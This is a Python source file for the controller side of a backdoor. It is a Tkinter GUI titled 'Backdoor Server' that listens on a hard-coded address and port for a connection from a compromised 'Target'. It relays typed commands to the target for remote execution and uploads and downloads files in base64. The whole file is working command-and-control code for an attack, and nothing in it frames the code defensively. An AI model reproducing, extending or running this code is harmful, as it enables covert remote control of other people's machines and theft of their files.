from tkinter import *
import socket
import base64
import threading

class Listener:
    def __init__(self, ip, port, gui_update_callback):
        self.ip = ip
        self.port = port
        self.gui_update_callback = gui_update_callback
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.ip, self.port))
        self.listener.listen(0)
        self.gui_update_callback(f"[+] Listening on {self.ip}:{self.port}")

    def reliable_send(self, data):
        data = ' '.join(data)
        self.connection.send(data.encode('ascii'))

    def reliable_receive(self):
        try:
            recv_msg = self.connection.recv(4096)
            recv_msg = recv_msg.decode('ascii')
            return recv_msg
        except:
            return "Error receiving data from client."

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def load_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        self.connection, address = self.listener.accept()
        self.gui_update_callback(f"[+] Got a connection from {address}")

    def command(self, command):    
        command = command.split(" ")
        if command[0] == "/upload":
            file_content = self.load_file(command[1])
            command.append(file_content)
         
        result = self.execute_remotely(command)

        if command[0] == "/download":
            result = self.save_file(command[1], result)

        return result

# GUI Functionality
def send():
    user_input = e.get()
    txt.insert(END, f"\nYou -> {user_input}")
    txt.yview(END)  # Scroll to the end
    result = listener.command(user_input)
               
    txt.insert(END, f"\nTarget -> {result}")
    txt.yview(END)  # Scroll to the end

def update_gui(message):
    txt.insert(END, f"\n{message}")
    txt.yview(END)  # Scroll to the end

# GUI Setup
def setup_gui():
    global txt, e

    root = Tk()
    root.title("Backdoor Server")

    BG_GRAY = "#ABB2B9"
    BG_COLOR = "#17202A"
    TEXT_COLOR = "#EAECEE"

    FONT = "Helvetica 14"
    FONT_BOLD = "Helvetica 13 bold"

    # Create GUI elements
    label1 = Label(root, bg=BG_COLOR, fg=TEXT_COLOR, text="Server", font=FONT_BOLD, pady=10, width=20, height=1)
    label1.grid(row=0)

    txt = Text(root, bg=BG_COLOR, fg=TEXT_COLOR, font=FONT, width=60)
    txt.grid(row=1, column=0, columnspan=2)

    scrollbar = Scrollbar(txt)
    scrollbar.place(relheight=1, relx=0.974)

    e = Entry(root, bg="#2C3E50", fg=TEXT_COLOR, font=FONT, width=55)
    e.grid(row=2, column=0)

    send_button = Button(root, text="Send", font=FONT_BOLD, bg=BG_GRAY, command=send)
    send_button.grid(row=2, column=1)

    return root

if __name__ == "__main__":
    # Setup GUI
    root = setup_gui()

    # Initialize the Listener and pass the GUI update callback
    listener = Listener("192.168.56.103", 9200, update_gui)

    # Start listener in a separate thread
    listener_thread = threading.Thread(target=listener.run)
    listener_thread.daemon = True
    listener_thread.start()

    # Start the GUI event loop
    root.mainloop()
